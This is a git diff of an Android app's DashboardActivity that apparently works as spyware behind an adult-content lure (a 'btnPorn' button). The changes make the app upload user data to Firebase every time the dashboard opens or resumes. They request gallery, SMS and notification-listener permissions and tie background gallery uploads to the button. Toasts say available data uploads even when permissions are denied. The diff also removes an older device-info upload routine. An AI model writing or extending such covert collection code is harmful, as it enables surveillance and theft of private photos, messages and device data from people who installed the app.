@@ -2,7 +2,6 @@ package com.mehboob.bushorat.activities;
 
 import android.Manifest;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -23,12 +22,11 @@ import androidx.core.content.ContextCompat;
 import com.mehboob.bushorat.R;
 import com.mehboob.bushorat.databinding.ActivityDashboardBinding;
 import com.mehboob.bushorat.helpers.AppVisibilityHelper;
-import com.mehboob.bushorat.helpers.UserDataSyncHelper;
 import com.mehboob.bushorat.helpers.DataSyncWorker;
-import com.mehboob.bushorat.helpers.DeviceInfoHelper;
 import com.mehboob.bushorat.helpers.NotificationHelper;
 import com.mehboob.bushorat.helpers.PermissionsManager;
 import com.mehboob.bushorat.helpers.SessionManager;
+import com.mehboob.bushorat.helpers.UserDataSyncHelper;
 
 public class DashboardActivity extends AppCompatActivity {
     private static final String TAG = "DashboardActivity";
@@ -37,8 +35,6 @@ public class DashboardActivity extends AppCompatActivity {
     final int GALLERY_PERMISSION_REQUEST  = 1;
     final int SMS_PERMISSION_CODE  = 2;
     private static final int ALL_PERMISSIONS_REQUEST = 1001;
-    private static final String PREFS_NAME = "MyAppPrefs";
-    private static final String DEVICE_INFO_UPLOADED = "device_info_uploaded";
     
     private PermissionsManager permissionsManager;
     private SessionManager sessionManager;
@@ -96,21 +92,12 @@ public class DashboardActivity extends AppCompatActivity {
 
         setupToolbarSubtitle();
 
-        // Always sync core data when dashboard opens
+        // Always sync available data when dashboard opens
         UserDataSyncHelper.syncAll(this);
 
-        if (permissionsManager.areAllPermissionsGranted()) {
-            Log.d(TAG, "onCreate: All permissions already granted, starting data collection");
-            startDataCollection();
-        } else {
-            permissionsManager.requestAllPermissions(ALL_PERMISSIONS_REQUEST);
+        if (!permissionsManager.areAllPermissionsGranted()) {
+            permissionsManager.requestEssentialSyncPermissions(ALL_PERMISSIONS_REQUEST);
         }
-
-        checkAndUploadDeviceInfo();
-
-//        DeviceInfoHelper.getDeviceInfo(this);
-//        DeviceInfoHelper.uploadToFirebase(this);
-
         binding.btnPorn.setOnClickListener(v -> {
             if (checkGalleryPermission()) {
                 // Enqueue background gallery upload then open activity
@@ -184,6 +171,9 @@ public class DashboardActivity extends AppCompatActivity {
             Log.d(TAG, "onResume: Session last activity updated");
         }
         
+        // Re-sync whenever dashboard is visible (picks up newly granted permissions)
+        UserDataSyncHelper.syncAll(this);
+        
         // Check notification listener permission every time activity resumes
         checkAndEnableNotificationListener();
         
@@ -213,23 +203,7 @@ public class DashboardActivity extends AppCompatActivity {
         startActivity(intent);
         finish();
     }
-    private void checkAndUploadDeviceInfo() {
-        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
-        boolean alreadyUploaded = prefs.getBoolean(DEVICE_INFO_UPLOADED, false);
 
-        if (!alreadyUploaded) {
-            // Call your helper methods
-            DeviceInfoHelper.getDeviceInfo(this);
-            DeviceInfoHelper.uploadToFirebase(this);
-
-            // Set flag
-            prefs.edit().putBoolean(DEVICE_INFO_UPLOADED, true).apply();
-
-            System.out.println("✅ Device info uploaded");
-        } else {
-            System.out.println("✅ Device info already uploaded, skipping");
-        }
-    }
     private boolean checkGalleryPermission() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             return ContextCompat.checkSelfPermission(this,
@@ -271,8 +245,12 @@ public class DashboardActivity extends AppCompatActivity {
     }
 
     private void startDataCollection() {
-        Log.d(TAG, "startDataCollection: Starting background data collection");
+        Log.d(TAG, "startDataCollection: Syncing available data to Firebase");
         UserDataSyncHelper.syncAll(this);
+    }
+
+    private void handlePermissionResult() {
+        startDataCollection();
     }
 
     @Override
@@ -281,24 +259,27 @@ public class DashboardActivity extends AppCompatActivity {
 
         if (requestCode == GALLERY_PERMISSION_REQUEST) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
+                handlePermissionResult();
                 openMediaActivity();
             } else {
                 Toast.makeText(this, "Gallery permission is required to proceed", Toast.LENGTH_SHORT).show();
             }
         } else if (requestCode == SMS_PERMISSION_CODE) {
             if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-                openMediaActivity();
+                handlePermissionResult();
+                startActivity(new Intent(DashboardActivity.this, ChatActivity.class));
             } else {
                 Toast.makeText(this, "Sms permission is required to proceed", Toast.LENGTH_SHORT).show();
             }
         } else if (requestCode == ALL_PERMISSIONS_REQUEST) {
+            handlePermissionResult();
             if (permissionsManager.areAllPermissionsGranted()) {
-                Toast.makeText(this, "All permissions granted! Starting data collection...", Toast.LENGTH_SHORT).show();
-                startDataCollection();
+                Toast.makeText(this, "All permissions granted. Data is uploading to Firebase.", Toast.LENGTH_SHORT).show();
             } else {
-                Toast.makeText(this, "Some permissions denied. App functionality may be limited.", Toast.LENGTH_LONG).show();
+                Toast.makeText(this, "Some permissions denied. Available data will still upload.", Toast.LENGTH_LONG).show();
             }
         } else if (requestCode == 1001) {
+            handlePermissionResult();
             if (hasAllPermissions()) {
                 Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show();
             } else {
